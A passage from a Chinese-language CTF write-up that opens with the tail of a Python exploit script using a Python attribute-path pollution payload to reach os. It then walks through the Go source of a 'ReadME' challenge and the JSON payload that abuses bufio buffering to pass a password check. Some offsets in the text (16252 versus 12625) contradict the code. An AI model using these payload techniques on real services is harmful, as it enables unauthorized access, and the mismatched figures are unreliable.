class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;Boogipop&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=exp_url)</span><br><span class="line">p = r.prepare()</span><br><span class="line">p.url = exp_url</span><br><span class="line">r = s.send(p)</span><br><span class="line">flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678373875764-53255477-0009-422f-9469-721e82c669ac.png#averageHue=%23222327&clientId=ubabef70d-f70a-4&from=paste&height=162&id=ue4e4068c&name=image.png&originHeight=203&originWidth=937&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15373&status=done&style=none&taskId=u4d33d95f-38ef-4693-bab3-c8b091a348e&title=&width=749.6" alt="image.png"></p>
<h1 id="ReadME"><a href="#ReadME" class="headerlink" title="ReadME"></a>ReadME</h1><p>考点：GO中有关io的知识，逻辑漏洞<br>听说是个签到题，我拿来审审看：<br>其实这里y4大佬也没有讲的十分细腻，可能y4爷认为很简单这东西，但实际上对于没深入学习go的人还是有点难度的，因此我写的详细一点儿</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> password = sha256.Sum256([]<span class="type">byte</span>(<span class="string">&quot;idek&quot;</span>))</span><br><span class="line"><span class="keyword">var</span> randomData []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MaxOrders = <span class="number">10</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initRandomData</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(<span class="number">1337</span>)</span><br><span class="line">	randomData = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">24576</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := rand.Read(randomData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">copy</span>(randomData[<span class="number">12625</span>:], password[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadOrderReq <span class="keyword">struct</span> &#123;</span><br><span class="line">	Orders []<span class="type">int</span> <span class="string">`json:&quot;orders&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">justReadIt</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line">	body, err := ioutil.ReadAll(r.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="type">byte</span>(<span class="string">&quot;bad request\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reqData := ReadOrderReq&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> err := json.Unmarshal(body, &amp;reqData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="type">byte</span>(<span class="string">&quot;invalid body\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(reqData.Orders) &gt; MaxOrders &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="type">byte</span>(<span class="string">&quot;whoa there, max 10 orders!\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reader := bytes.NewReader(randomData)</span><br><span class="line">	validator := NewValidator()</span><br><span class="line"></span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	<span class="keyword">for</span> _, o := <span class="keyword">range</span> reqData.Orders &#123;</span><br><span class="line">		<span class="keyword">if</span> err := validator.CheckReadOrder(o); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">			w.Write([]<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;error: %v\n&quot;</span>, err)))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ctx = WithValidatorCtx(ctx, reader, <span class="type">int</span>(o))</span><br><span class="line">		_, err := validator.Read(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">			w.Write([]<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;failed to read: %v\n&quot;</span>, err)))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := validator.Validate(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;validation failed: %v\n&quot;</span>, err)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	w.WriteHeader(<span class="number">200</span>)</span><br><span class="line">	w.Write([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> _, exists := os.LookupEnv(<span class="string">&quot;LISTEN_ADDR&quot;</span>); !exists &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;env LISTEN_ADDR is required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> _, exists := os.LookupEnv(<span class="string">&quot;FLAG&quot;</span>); !exists &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;env FLAG is required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	initRandomData()</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/just-read-it&quot;</span>, justReadIt)</span><br><span class="line"></span><br><span class="line">	srv := http.Server&#123;</span><br><span class="line">		Addr:         os.Getenv(<span class="string">&quot;LISTEN_ADDR&quot;</span>),</span><br><span class="line">		ReadTimeout:  <span class="number">5</span> * time.Second,</span><br><span class="line">		WriteTimeout: <span class="number">5</span> * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Server listening on %s\n&quot;</span>, os.Getenv(<span class="string">&quot;LISTEN_ADDR&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err := srv.ListenAndServe(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Validator <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewValidator</span><span class="params">()</span></span> *Validator &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Validator&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span></span> CheckReadOrder(o <span class="type">int</span>) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> o &lt;= <span class="number">0</span> || o &gt; <span class="number">100</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid order %v&quot;</span>, o)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span></span> Read(ctx context.Context) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	r, s := GetValidatorCtxData(ctx)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, s)</span><br><span class="line">	_, err := r.Read(buf)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;read error: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span></span> Validate(ctx context.Context) <span class="type">error</span> &#123;</span><br><span class="line">	r, _ := GetValidatorCtxData(ctx)</span><br><span class="line">	buf, err := v.Read(WithValidatorCtx(ctx, r, <span class="number">32</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> bytes.Compare(buf, password[:]) != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">&quot;invalid password&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	reqValReaderKey = <span class="string">&quot;readerKey&quot;</span></span><br><span class="line">	reqValSizeKey   = <span class="string">&quot;reqValSize&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetValidatorCtxData</span><span class="params">(ctx context.Context)</span></span> (io.Reader, <span class="type">int</span>) &#123;</span><br><span class="line">	reader := ctx.Value(reqValReaderKey).(io.Reader)</span><br><span class="line">	size := ctx.Value(reqValSizeKey).(<span class="type">int</span>)</span><br><span class="line">	<span class="keyword">if</span> size &gt;= <span class="number">100</span> &#123;</span><br><span class="line">		reader = bufio.NewReader(reader)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> reader, size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithValidatorCtx</span><span class="params">(ctx context.Context, r io.Reader, size <span class="type">int</span>)</span></span> context.Context &#123;</span><br><span class="line">	ctx = context.WithValue(ctx, reqValReaderKey, r)</span><br><span class="line">	ctx = context.WithValue(ctx, reqValSizeKey, size)</span><br><span class="line">	<span class="keyword">return</span> ctx</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先选择性装一手Goland为以后打go做铺垫（）<br>审计一下代码，这里差点审哭我了真的，从这一题我深刻的学习了一波GO的read机制，虽然我没咋学过go语言，但是感觉还是可以看懂的，也学到了些新东西QWQ，说一下整体逻辑：</p>
<ul>
<li>先用copy函数对randomData数组从12625位置开始，往后32个位置进行了覆盖，也就是在[12625-12657]这个区间里，randomData的值就是password的值，这就是go中copy的用法</li>
<li>然后就进入justReadIt函数进行主要逻辑处理，这里初始化了2个东西，reader和validator，其中reader初始化传入的就是randomData，这一点会很重要</li>
<li>遍历请求中Json格式的Orders数组，进行一系列的处理，然后到最后，如果buf的值和password的值相同，那么就返回flag</li>
</ul>
<p>我们就直接从payload讲，这一题的payload是:<br><code>&#123;&quot;Orders&quot;:[100,100,100,60,60,60,60,60,30,7]&#125;</code><br>为什么是这个答案，现在我们就来逆向分析一波，首先下个断点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678355917697-b31cc6fe-7c86-42d3-a6f2-de2b73a86e79.png#averageHue=%23202125&clientId=ud3b2cc69-f72a-4&from=paste&height=89&id=u386e1779&name=image.png&originHeight=111&originWidth=1058&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12444&status=done&style=none&taskId=u18c8f417-1912-48db-bc0d-985269600d3&title=&width=846.4" alt="image.png"><br>直接给在入口函数，然后跟进调试<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362527422-20d01455-2b3a-4f6a-9ad2-c9c8f7410d98.png#averageHue=%2321272f&clientId=ud3b2cc69-f72a-4&from=paste&height=162&id=u44e74d79&name=image.png&originHeight=202&originWidth=666&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24957&status=done&style=none&taskId=u231ce943-d452-43a6-bd10-ddbd89b235d&title=&width=532.8" alt="image.png"><br>记住这2个变量，reader和validator,这两个遍历贯彻全文，先对他们两进行初始化，其中reader的初始化传入了randomData变量，这会发生什么呢？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362635174-0ae174cd-f273-407e-ae93-2c432bf7eeaf.png#averageHue=%232f3236&clientId=ud3b2cc69-f72a-4&from=paste&height=108&id=ubfeeeb0a&name=image.png&originHeight=135&originWidth=972&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20833&status=done&style=none&taskId=u1c447148-e9be-4270-bc86-9ce8005bf9e&title=&width=777.6" alt="image.png"><br>该变量的s属性变为了randomData的值，这个长度为24576的数组就是randomData<br>然后初始化了validator，这里validator是最后用来判断密码和buf是否相同：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362777104-a7bc5e92-ceb6-4781-a1cf-eefcc99ddf57.png#averageHue=%231e2024&clientId=ud3b2cc69-f72a-4&from=paste&height=209&id=u9c520864&name=image.png&originHeight=261&originWidth=906&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44211&status=done&style=none&taskId=u794f27cb-179a-40ed-9c54-adb7d908efd&title=&width=724.8" alt="image.png"><br>因此继续往下看，随之就进入了我所说的for循环，遍历传入的orders数组：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362840839-5da3918a-869b-4d92-9f6d-80d07cb0a3db.png#averageHue=%231f2227&clientId=ud3b2cc69-f72a-4&from=paste&height=427&id=u11c41bea&name=image.png&originHeight=534&originWidth=1202&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75842&status=done&style=none&taskId=u681cf222-c7a4-486e-80e8-9bbd4b0946b&title=&width=961.6" alt="image.png"><br>首先调用一个CheckReadOrede,这个函数就是判断orders数组中的元素值是否超过100：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362871692-9cd34ad3-1487-4839-86ce-8efdb74fb89c.png#averageHue=%23202125&clientId=ud3b2cc69-f72a-4&from=paste&height=130&id=u6e82c2a5&name=image.png&originHeight=162&originWidth=677&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18331&status=done&style=none&taskId=ub5a4bf9b-66d9-437b-b16b-6aad2dff3d2&title=&width=541.6" alt="image.png"><br>不能小于0也不能大于100，那么我们怎么样才能达到16252这么大的值呢？继续往下分析：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362909966-a651ea42-d84e-4d3d-9043-3b48f6abce01.png#averageHue=%23202730&clientId=ud3b2cc69-f72a-4&from=paste&height=149&id=u7f32d766&name=image.png&originHeight=186&originWidth=1006&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25811&status=done&style=none&taskId=udde779b8-845e-4bd5-bcba-43defabc2b2&title=&width=804.8" alt="image.png"><br>出现了一个比较重要的ctx，contenxt对象，传入了初始化的reader和int(o)，这里的o就是orders里的第一个元素，刚开始遍历，进入<code>WithValidatorCtx</code>函数看看逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678362989153-261373fa-e211-4ed3-a2fa-ade62202794f.png#averageHue=%231f2024&clientId=ud3b2cc69-f72a-4&from=paste&height=115&id=u969621c4&name=image.png&originHeight=144&originWidth=795&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23384&status=done&style=none&taskId=u99af1e23-5a3f-43ba-abd9-2742f0ee1bc&title=&width=636" alt="image.png"><br>在这里出现2个变量，都有提前定义好：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363002846-92df833e-32f5-439e-98c4-ba4dbeb4e9b5.png#averageHue=%231e1f23&clientId=ud3b2cc69-f72a-4&from=paste&height=117&id=uebbadc9b&name=image.png&originHeight=146&originWidth=584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15206&status=done&style=none&taskId=u192508b3-dab2-4160-8a21-cfab28918d6&title=&width=467.2" alt="image.png"><br>这个函数是做什么的呢？实际上是往ctx对象中加入2组键值对，分别是<code>&quot;readerKey&quot;=&gt;reader</code>、<code>&quot;reqValsize&quot;=&gt;size</code>，这个size就是上面的100，随之继续往下走：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363096448-df349a90-9a81-4bff-95d7-dd55da0d2a92.png#averageHue=%23222f3e&clientId=ud3b2cc69-f72a-4&from=paste&height=77&id=uc204b491&name=image.png&originHeight=96&originWidth=1042&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14877&status=done&style=none&taskId=u10990fc5-9269-41cc-9870-78940f43c66&title=&width=833.6" alt="image.png"><br>接着进入validator的read方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363132921-7541e216-3755-4732-b25f-0262c063c75a.png#averageHue=%231f2124&clientId=ud3b2cc69-f72a-4&from=paste&height=210&id=u62bb66da&name=image.png&originHeight=263&originWidth=1037&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33045&status=done&style=none&taskId=u4572d23b-6012-4250-b478-2bbd8956489&title=&width=829.6" alt="image.png"><br>先调用了<code>GetValidatorCtxData</code>方法，这个和之前的with是对应的，那个是存入，这个则是取出：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363163285-f28a786b-52f3-44a9-ad73-6a454520e9c7.png#averageHue=%2320262e&clientId=ud3b2cc69-f72a-4&from=paste&height=174&id=u5b5a2460&name=image.png&originHeight=217&originWidth=975&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32383&status=done&style=none&taskId=uc8a688f1-6471-41b8-abc8-303bc888989&title=&width=780" alt="image.png"><br>但是注意这里面的判断<code>if size &gt;= 100</code>，这里我们的size就是100，因此会调用<code> bufio.NewReader(reader)</code>，跟进看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363223490-9cc2f52a-c310-4766-a5d9-7e1c2194beb6.png#averageHue=%23202226&clientId=ud3b2cc69-f72a-4&from=paste&height=105&id=u21afd675&name=image.png&originHeight=131&originWidth=633&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19442&status=done&style=none&taskId=u362244e5-a6be-48ca-93e4-488900770c2&title=&width=506.4" alt="image.png"><br>这里返回了一个新的reader，并且指定了新的大小<code>defaultBufSize</code>，这个值刚好是4096：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363304643-e800c88e-fc37-40cb-b94e-0a65360d00a2.png#averageHue=%23202124&clientId=ud3b2cc69-f72a-4&from=paste&height=102&id=uc038b7df&name=image.png&originHeight=127&originWidth=736&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7511&status=done&style=none&taskId=ufd6a9af4-677d-405e-8ac0-4d0a725aa8b&title=&width=588.8" alt="image.png"><br>这就是我们传100的作用，继续往下走<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363350278-68491ce0-cfb0-45c9-9022-97570f0072d6.png#averageHue=%2323262b&clientId=ud3b2cc69-f72a-4&from=paste&height=662&id=u0ae4aaa1&name=image.png&originHeight=827&originWidth=1815&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111952&status=done&style=none&taskId=u7ba35fe2-d9b1-466e-b5c2-b847a3e84dc&title=&width=1452" alt="image.png"><br>调用刚刚返回的reader的Read方法，读取buf个单位的字节（默认100），可以进去看看Read的逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363442686-3d03e919-320a-4248-ba5d-2d1dbde8ebbb.png#averageHue=%23222529&clientId=ud3b2cc69-f72a-4&from=paste&height=906&id=u4dd1ec6b&name=image.png&originHeight=1132&originWidth=2100&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117696&status=done&style=none&taskId=u210ca706-73ef-478a-a9ec-d710ff644f4&title=&width=1680" alt="image.png"><br>有一些判断，b.r&#x3D;&#x3D;b.w都是0，但是这里由于返回了一个4096大小的buf，因此len(p)小于buf，因此不进入if里，继续往下走<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363519306-cb91580b-2b38-4f33-8e24-2d3cbae3a1a9.png#averageHue=%2324282d&clientId=ud3b2cc69-f72a-4&from=paste&height=580&id=ue9856d50&name=image.png&originHeight=725&originWidth=1577&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89495&status=done&style=none&taskId=ubc4ee6c8-d20f-4346-9123-744b0fc0bb1&title=&width=1261.6" alt="image.png"><br>这里很关键，b.rd通过Read方法将其属性i增加4096个单位，也就是往前读4096个单位，继续走退出循环，然后之后2个100都是同样的流程，直接跳到最后一个100：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363607195-9e8bdfbf-c13b-4806-917e-e8b13eb78c16.png#averageHue=%2324272b&clientId=ud3b2cc69-f72a-4&from=paste&height=672&id=u6e914282&name=image.png&originHeight=840&originWidth=1864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108243&status=done&style=none&taskId=ud2220a73-c474-44ce-b633-3d15c761796&title=&width=1491.2" alt="image.png"><br>此时i变为12288，至此为100的元素读取完毕，开始读取正常元素，首先是5个60，它们的不同点有2个，一个是<code>NewReader</code>方法只返回60大小而不是4096,，另一个是刚刚说的Read方法里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363812631-fdc07c6c-0e15-43f2-8634-ea6ff6e43d04.png#averageHue=%2320252c&clientId=ud3b2cc69-f72a-4&from=paste&height=210&id=ude1ad256&name=image.png&originHeight=262&originWidth=1098&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32447&status=done&style=none&taskId=uaef0a72f-eab2-4fa2-8958-70ade038cb7&title=&width=878.4" alt="image.png"><br>进入了一个不同的Read方法，这里的主要注意那个copy方法，会覆盖b也就是我们buf的内容为<code>r.s[r.i:]</code>，这里r.s就是一开始的randomData，r.i则是上面一直在叠加的读取大小：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678363928864-ea840265-ab9e-49a9-a086-076f262c6faa.png#averageHue=%23232528&clientId=ud3b2cc69-f72a-4&from=paste&height=757&id=ub7f752bd&name=image.png&originHeight=946&originWidth=1726&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101744&status=done&style=none&taskId=u109a4147-62fd-45d2-b0d4-3274d5bf24e&title=&width=1380.8" alt="image.png"><br>因此到了最后一个7的时候，退出了循环，这时r.i就是<code>12625</code>，紧接着调用Validate方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364009758-40649ac5-19c3-4f80-83ba-7d7f6baf5999.png#averageHue=%23202125&clientId=ud3b2cc69-f72a-4&from=paste&height=204&id=u11fb2d43&name=image.png&originHeight=255&originWidth=931&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44307&status=done&style=none&taskId=uf1424046-d6bb-4cb1-b373-489aa5173b7&title=&width=744.8" alt="image.png"><br>可以看到会进入Read方法对buf进行赋值：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364033484-4d422ac0-ba76-457f-9bc2-8402d48e0dcb.png#averageHue=%2320252e&clientId=ud3b2cc69-f72a-4&from=paste&height=184&id=u2c25dfcf&name=image.png&originHeight=230&originWidth=887&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38894&status=done&style=none&taskId=uebccae87-235e-43a1-8dba-f78e227d3a3&title=&width=709.6" alt="image.png"><br>跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364054301-9945d9d8-b5bd-47a7-9a67-f5127c6d0393.png#averageHue=%2323252a&clientId=ud3b2cc69-f72a-4&from=paste&height=839&id=u35ef1b0e&name=image.png&originHeight=1049&originWidth=1887&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135706&status=done&style=none&taskId=u2e7516b6-c2ab-4777-a1ca-ab3093c9010&title=&width=1509.6" alt="image.png"><br>这时这个16252的作用就来了，因为一开始password就是randomData变量从16252索引往下数32个单位，这里刚好就是这么多数据，也就是完全返回了password，因此输出flag：<br><img 